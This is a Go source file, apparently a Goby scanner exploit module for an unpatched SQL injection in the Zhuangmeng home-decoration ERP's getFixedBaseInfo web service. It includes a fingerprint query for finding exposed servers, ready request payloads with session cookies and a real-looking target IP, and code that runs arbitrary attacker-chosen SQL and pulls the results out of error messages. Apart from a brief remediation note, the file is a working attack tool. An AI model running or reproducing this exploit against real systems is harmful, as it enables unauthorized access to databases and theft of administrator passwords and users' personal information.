package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Home Decoration /WEB_SERVICE/Budget.asmx/getFixedBaseInfo ERP SQL Injection Vulnerability",
    "Description": "<p>Shanghai Zhuangmeng Information Technology Co., Ltd. is a software service company specializing in enterprise management solutions for the decoration industry. It independently develops and possesses multiple core technologies with national copyright certificates.</p><p>There is an SQL injection vulnerability in the home decoration ERP system of Zhuangming. In addition to exploiting the vulnerability to obtain information from the database (such as administrator background passwords, personal information of site users), attackers can even write Trojans to the server in high permission situations, further obtaining server system privileges.</p>",
    "Product": "Zhuangmeng-Home-improvement-ERP",
    "Homepage": "http://www.znfit.com/",
    "DisclosureDate": "2024-04-09",
    "PostTime": "2024-05-17",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "title=\"家装ERP管理系统\" || body=\"版权所有：上海装盟信息科技有限公司\"",
    "GobyQuery": "title=\"家装ERP管理系统\" || body=\"版权所有：上海装盟信息科技有限公司\"",
    "Level": "2",
    "Impact": "<p>There is an SQL injection vulnerability in the home decoration ERP system of Zhuangming. In addition to exploiting the vulnerability to obtain information from the database (such as administrator background passwords, personal information of site users), attackers can even write Trojans to the server in high permission situations, further obtaining server system privileges.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.znfit.com/\">http://www.znfit.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "db_name()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/WEB_SERVICE/Budget.asmx/getFixedBaseInfo",
                "follow_redirect": true,
                "header": {
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "ASP.NET_SessionId=cn4idqvfnnqhf255csir2uul; UserName=%e7%b3%bb%e7%bb%9f%e7%ae%a1%e7%90%86%e5%91%98; Usercode=admin; Demp=1020101; DempName=%e6%80%bb%e7%bb%8f%e5%8a%9e; RoleID=1; Company=102; Subsid=10201; RoleArea=3; LookTel=%e6%98%af; LookAddress=%e6%98%af; LookFloor=%e6%98%af; TelType=%e4%b8%8d%e9%99%90; AddressType=%e4%b8%8d%e9%99%90; FloorType=%e4%b8%8d%e9%99%90",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "where=dename+like+'%251%25'+and+company%3D''+and+isnull(state%2C'')%3C%3E'%E5%81%9C%E7%94%A8'AND 9569 IN (SELECT db_name())&intPageIndex=1&pageSize=20"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/WEB_SERVICE/Budget.asmx/getFixedBaseInfo",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/WEB_SERVICE/Budget.asmx/getFixedBaseInfo"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/WEB_SERVICE/Budget.asmx/getFixedBaseInfo",
                "follow_redirect": true,
                "header": {
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.3) Gecko/20061201 Firefox/2.0.0.3 (Ubuntu-feisty)",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "http://39.101.198.141:8015",
                    "Referer": "http://39.101.198.141:8015/Budget/FixedBaseInfo.htm",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "ASP.NET_SessionId=1h03aiqcryrb44cz0zromoui; Power.loginUser=",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "where={{{content}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?:')([\\w\\s\\S]+)(?:')"
            ]
        }
    ],
    "Tags": [
        "HW-2023",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "家装ERP /WEB_SERVICE/Budget.asmx/getFixedBaseInfo SQL 注入漏洞",
            "Product": "装盟科技-家装ERP管理系统",
            "Description": "<p>上海装盟信息科技有限公司是一家专注于装饰行业企业管理解决方案的软件服务公司，自主研发并拥有国家颁发版权证书的多项核心技术的软件技术企业。</p><p>装盟的家装ERP存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞:<a href=\"http://www.znfit.com/\">http://www.znfit.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>装盟的家装ERP存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "HW-2023",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Home Decoration /WEB_SERVICE/Budget.asmx/getFixedBaseInfo ERP SQL Injection Vulnerability",
            "Product": "Zhuangmeng-Home-improvement-ERP",
            "Description": "<p>Shanghai Zhuangmeng Information Technology Co., Ltd. is a software service company specializing in enterprise management solutions for the decoration industry. It independently develops and possesses multiple core technologies with national copyright certificates.</p><p>There is an SQL injection vulnerability in the home decoration ERP system of Zhuangming. In addition to exploiting the vulnerability to obtain information from the database (such as administrator background passwords, personal information of site users), attackers can even write Trojans to the server in high permission situations, further obtaining server system privileges.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.znfit.com/\">http://www.znfit.com/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is an SQL injection vulnerability in the home decoration ERP system of Zhuangming. In addition to exploiting the vulnerability to obtain information from the database (such as administrator background passwords, personal information of site users), attackers can even write Trojans to the server in high permission situations, further obtaining server system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "HW-2023",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	sendPayload1715914613 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		uri := `/WEB_SERVICE/Budget.asmx/getFixedBaseInfo`
		payload := "where=dename+like+'%251%25'+and+company%3D''+and+isnull(state%2C'')%3C%3E'%E5%81%9C%E7%94%A8'AND+9569+IN+(" + sql + ")&intPageIndex=1&pageSize=20"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.Timeout = 15
		cfg.Header.Store("Content-Type", " application/x-www-form-urlencoded")
		cfg.Header.Store("Referer", " "+hostInfo.FixedHostInfo+"/Budget/FixedBaseInfo.htm")
		cfg.Data = payload

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 500 {
			return nil, errors.New("not response 500")
		}
		if !strings.Contains(resp.Utf8Html, "nvarchar") {
			return nil, errors.New("not info")
		}
		return httpclient.DoHttpRequest(hostInfo, cfg)

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload1715914613
			feature := goutils.RandomHexString(8)
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `SELECT+'` + feature + `'%2bdb_name()%2b'` + feature + `'`
			_, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/WEB_SERVICE/Budget.asmx/getFixedBaseInfo`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload1715914613
			makeRegularAAAA := func(RegularContent string, RegularUrl string) (string, error) {
				reRequestAAAA := regexp.MustCompile(RegularUrl)
				if !reRequestAAAA.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequestAAAA.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			feature := goutils.RandomHexString(8)
			sql := goutils.B2S(stepLogs.Params["sql"])
			sql = `SELECT+'` + feature + `'%2b` + sql + `%2b'` + feature + `'`
			if attackType == "sql" {
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				respResult, err := makeRegularAAAA(resp.Utf8Html, feature+`(.*?)`+feature)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = respResult
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `POST /WEB_SERVICE/Budget.asmx/getFixedBaseInfo HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Referer: ` + expResult.HostInfo.FixedHostInfo + `Budget/FixedBaseInfo.htm
Connection: close

where=dename+like+'%251%25'+and+company%3D''+and+isnull(state%2C'')%3C%3E'%E5%81%9C%E7%94%A8'AND+9569+IN+(SELECT+'` + feature + `'%2bdb_name()%2b'` + feature + `')&intPageIndex=1&pageSize=20`
			}
			return expResult
		},
	))
}
